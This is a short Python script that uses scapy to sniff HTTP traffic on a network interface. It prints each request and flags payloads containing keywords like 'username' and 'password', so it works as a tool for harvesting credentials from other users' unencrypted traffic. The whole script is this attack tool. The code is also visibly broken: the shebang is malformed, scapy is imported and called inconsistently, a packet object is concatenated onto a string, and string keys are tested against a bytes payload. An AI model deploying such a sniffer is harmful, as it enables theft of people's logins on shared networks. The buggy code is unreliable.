#! usr/bin/env/ python
import scapy.all
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="Specify interface on which to sniff packetttttts")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] Http Requessst >> " + packet[http.HTTPRequest].host + packet[http.HTTPRequest])
        if packet.haslayer(scapy.raw):
            load = packet[scapy.RAW].load
            keys = ["username", "password","pass","email"]
            for key in keys:
                if key in load:
                    print("[+] Possible password/username >> " + load)
                    break

iface = get_interface()
sniff(iface)
